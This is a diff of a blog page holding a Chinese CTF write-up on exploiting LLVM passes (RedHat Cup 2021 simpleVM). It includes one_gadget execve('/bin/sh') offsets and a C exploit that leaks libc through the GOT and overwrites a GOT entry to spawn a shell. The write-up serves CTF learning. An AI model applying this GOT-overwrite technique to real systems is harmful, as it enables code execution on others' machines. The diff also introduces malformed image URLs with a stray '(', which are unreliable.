@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/b5ad2c29baf17e67500009cf8cc55e5c.png">
+  <link rel="icon" href="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/b5ad2c29baf17e67500009cf8cc55e5c.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -86,7 +86,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"lekclc.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"lekclc.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -208,7 +208,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+     style="background: url('https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/7012ca954f09f7ab9c5864109291fbd0.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
@@ -332,19 +332,19 @@
 
 <h1 id="逆向-so"><a href="#逆向-so" class="headerlink" title="逆向.so"></a>逆向.so</h1><p>一般<code>CTF</code>题都重写了<code>FunctionPass</code>类中的<code>runOnFunction</code>函数</p>
 <h2 id="定位runOnFunction"><a href="#定位runOnFunction" class="headerlink" title="定位runOnFunction"></a>定位<code>runOnFunction</code></h2><h3 id="搜索vtable"><a href="#搜索vtable" class="headerlink" title="搜索vtable"></a>搜索<code>vtable</code></h3><p>用<code>IDA</code>对<code>so</code>模块逆向分析，在<code>IDA</code>中搜索<code>vtable</code>，定位到虚表后，虚表最后的一项<strong>函数</strong>就是重写的<code>runOnFunction</code>函数</p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/3bab3f2b54be3455d43596cc8b626597.png" srcset="/img/loading.gif" lazyload alt="20240716232504733"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/3bab3f2b54be3455d43596cc8b626597.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716232504733"></p>
 <h3 id="PASS注册名称"><a href="#PASS注册名称" class="headerlink" title="PASS注册名称"></a><code>PASS</code>注册名称</h3><p>一般会在<code>README</code>文件中给出，若是没有给出，可通过对<code>__cxa_atexit</code>函数“交叉引用”来定位</p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/5c6db733af49267642c2a951e582d2a1.png" srcset="/img/loading.gif" lazyload alt="20240716232841397"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/5c6db733af49267642c2a951e582d2a1.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716232841397"></p>
 <h1 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h1><p>首先用<code>gdb</code>调试<code>opt</code>并用<code>set args</code>设置参数传入，然后在<code>main</code>函数下断点运行即可</p>
 <p>例如</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">gdb <span class="hljs-keyword">opt</span>-<span class="hljs-number">12</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">args</span> -load ./LLVMHello.<span class="hljs-keyword">so</span> -Hello ./test.<span class="hljs-keyword">ll</span><br><span class="hljs-keyword">b</span> main<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/8498f645fef729be9d17bd1c29600aca.png" srcset="/img/loading.gif" lazyload alt="20240716233226205"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/8498f645fef729be9d17bd1c29600aca.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716233226205"></p>
 <p>然而<code>opt</code>并不会一开始就将<code>so</code>模块加载进来，而是在下图所示的<code>call</code>指令（在<code>call</code>了一堆<code>llvm</code>初始化相关函数后的第一个<code>call</code>）执行完之后，才会加载<code>so</code>模块</p>
 <p>加载过后,我们利用<code>vmmap</code>便可以看到<code>.so</code>的基地址</p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/799776a363304d42848dd783251c3a9e.png" srcset="/img/loading.gif" lazyload alt="20240716233902699"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/799776a363304d42848dd783251c3a9e.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716233902699"></p>
 <p>我们可以将断点下在<code>llvm::Pass::preparePassManager</code>,此时基本已经加载了<code>.so</code>模块</p>
 <p>然后就可以根据偏移进一步将断点下在<code>.so</code>模块</p>
 <p>重写的<code>runOnFunction</code>函数的调用链为:</p>
@@ -356,32 +356,32 @@
 
 
 
-<h1 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="红帽杯-2021 simpleVM"></a>红帽杯-2021 simpleVM</h1><h2 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h2><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/4fba2e6ee3513536c1223cfd4999514d.png" srcset="/img/loading.gif" lazyload alt="20240716234639713"></p>
+<h1 id="红帽杯-2021-simpleVM"><a href="#红帽杯-2021-simpleVM" class="headerlink" title="红帽杯-2021 simpleVM"></a>红帽杯-2021 simpleVM</h1><h2 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h2><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/4fba2e6ee3513536c1223cfd4999514d.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716234639713"></p>
 <h2 id="runOnFunction"><a href="#runOnFunction" class="headerlink" title="runOnFunction"></a>runOnFunction</h2><p>定位到runOnFunction</p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/447ea4e8c54b327f32ca335b60a0f14a.png" srcset="/img/loading.gif" lazyload alt="20240716235657948"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/447ea4e8c54b327f32ca335b60a0f14a.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716235657948"></p>
 <p>当函数名为<code>o0o0o0o0</code>调用<code>sub_6AC0</code></p>
 <h2 id="sub-6AC0"><a href="#sub-6AC0" class="headerlink" title="sub_6AC0"></a>sub_6AC0</h2><p>在<code>sub_6AC0中,遍历每一个基本块,会调用</code>sub_6B80`</p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/03f0721fb7135a0eab85a257341be353.png" srcset="/img/loading.gif" lazyload alt="20240716235829215"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/03f0721fb7135a0eab85a257341be353.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240716235829215"></p>
 <h2 id="sub-6B80"><a href="#sub-6B80" class="headerlink" title="sub_6B80"></a>sub_6B80</h2><p>在<code>sub_6B80</code>中,遍历每一个基本块的指令</p>
 <p>当函数名为”pop, push,store,load,add,min”, 分别会执行对应的操作</p>
-<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/c63da8c950db3d739957b7dcac06cd43.png" srcset="/img/loading.gif" lazyload alt="20240717000510581"></p>
+<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/c63da8c950db3d739957b7dcac06cd43.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000510581"></p>
 <p>操作数要求为两个,即一个变量</p>
 <p>ZExtValue 为常量的值(由<code>(v35,0)</code>指定为该函数第一个参数)</p>
 <p>将<code>off_20DFD8</code>内的值作为<code>SP</code>栈顶指针,执行出栈操作</p>
 <p>可以,将出栈的值写到两个全局变量中的一个</p>
-<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/881f5d41df867393a8c1c6bd4f2538ef.png" srcset="/img/loading.gif" lazyload alt="20240717000542773"></p>
+<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/881f5d41df867393a8c1c6bd4f2538ef.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000542773"></p>
 <p>操作数要求为两个,即一个变量</p>
 <p>将<code>off_20DFD8</code>内的值作为<code>SP</code>栈顶指针,执行入栈操作</p>
-<h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/8345e9e3175503810682183c0876aaac.png" srcset="/img/loading.gif" lazyload alt="20240717000632227"></p>
+<h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/8345e9e3175503810682183c0876aaac.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000632227"></p>
 <p>将一个全局变量视作地址,另一个视作变量</p>
 <p>将变量写入地址处</p>
-<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d673f80268bc15a61c09800a4b6eba20.png" srcset="/img/loading.gif" lazyload alt="20240717000652743"></p>
+<h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d673f80268bc15a61c09800a4b6eba20.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000652743"></p>
 <p>将一个全局变量视作地址,另一个视作变量</p>
 <p>将地址的内容读出到变量</p>
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/183e65fb2b283a1675d77e269d2fea32.png" srcset="/img/loading.gif" lazyload alt="20240717000709736"></p>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/183e65fb2b283a1675d77e269d2fea32.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000709736"></p>
 <p>将两个全局变量视作变量</p>
 <p>其中一个可以加上一个常量</p>
-<h3 id="min"><a href="#min" class="headerlink" title="min"></a>min</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/0eb00cb409975733bd2154a43d881f4a.png" srcset="/img/loading.gif" lazyload alt="20240717000729147"></p>
+<h3 id="min"><a href="#min" class="headerlink" title="min"></a>min</h3><p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/0eb00cb409975733bd2154a43d881f4a.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717000729147"></p>
 <p>将两个全局变量视作变量</p>
 <p>其中一个可以减去一个常量</p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><code>opt</code>一般不会开启<code>PIE</code></p>
@@ -394,13 +394,13 @@
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">Ubuntu GLIBC <span class="hljs-number">2.31</span>-0ubuntu9<span class="hljs-number">.14</span><br><br><span class="hljs-number">0xe3afe</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">r12</span>)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">r15</span>] == NULL || <span class="hljs-built_in">r15</span> == NULL<br>  [<span class="hljs-built_in">r12</span>] == NULL || <span class="hljs-built_in">r12</span> == NULL<br><br><span class="hljs-number">0xe3b01</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">r15</span>, <span class="hljs-built_in">rdx</span>)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">r15</span>] == NULL || <span class="hljs-built_in">r15</span> == NULL<br>  [<span class="hljs-built_in">rdx</span>] == NULL || <span class="hljs-built_in">rdx</span> == NULL<br><br><span class="hljs-number">0xe3b04</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rdx</span>)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsi</span>] == NULL || <span class="hljs-built_in">rsi</span> == NULL<br>  [<span class="hljs-built_in">rdx</span>] == NULL || <span class="hljs-built_in">rdx</span> == NULL<br></code></pre></td></tr></table></figure>
 
 <p>在跳过<code>main+11507</code>后,我们很快便找到了一个满足条件的<code>got</code></p>
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/36be2987e129d68eb308d2fd234e6444.png" srcset="/img/loading.gif" lazyload alt="20240717015257547"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/36be2987e129d68eb308d2fd234e6444.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717015257547"></p>
 <p><code>exp</code>为</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">//clang-8 -emit-llvm -S exp.c -o exp.ll</span><br><span class="hljs-comment">//set args -load ./VMPass.so -VMPass ./exp.ll</span><br><span class="hljs-comment">//b * main + 11507</span><br><span class="hljs-comment">//b llvm::Pass::preparePassManager</span><br><span class="hljs-comment">//b * 0x70B3</span><br>void <span class="hljs-built_in">pop</span>(int c);<br>void <span class="hljs-built_in">push</span>(int c);<br>void <span class="hljs-built_in">store</span>(int c);<br>void <span class="hljs-built_in">load</span>(int c);<br>void <span class="hljs-built_in">add</span>(int c,int x);<br>void <span class="hljs-built_in">min</span>(int ,int x);<br><span class="hljs-comment">//one_gadget 0xe3afe,0xe3b01,0xe3b04</span><br>void <span class="hljs-built_in">o0o0o0o0</span>()&#123;<br><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x77DD90);<span class="hljs-comment">//此时1为libc_start_main的got</span><br>    <span class="hljs-built_in">load</span>(<span class="hljs-number">1</span>);<span class="hljs-comment">//此时2为libc_start_main在libc中的地址</span><br>    <span class="hljs-built_in">min</span>(<span class="hljs-number">2</span>,<span class="hljs-number">147344</span>);<span class="hljs-comment">//此时2为libc.address</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>xe3afe);<span class="hljs-comment">//此时2为one_gadget</span><br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>x77E000-<span class="hljs-number">0</span>x77DD90);<span class="hljs-comment">//此时1为0x77E000的got</span><br>    <span class="hljs-built_in">store</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/817bd4302a956b96d230b9c42823de23.png" srcset="/img/loading.gif" lazyload alt="20240717015010109"></p>
+<p><img src="https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/817bd4302a956b96d230b9c42823de23.png" srcset="/(https://pub-808b90b25ac94f99b07662ad753ee98f.r2.dev/2024/08/d41d2520dd3d425dbb3fb0cd5dfd76a2.gif" lazyload alt="20240717015010109"></p>
 <p>[]: <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-274259.htm">https://bbs.kanxue.com/thread-274259.htm</a>    “LLVM　PASS”</p>
 
                 
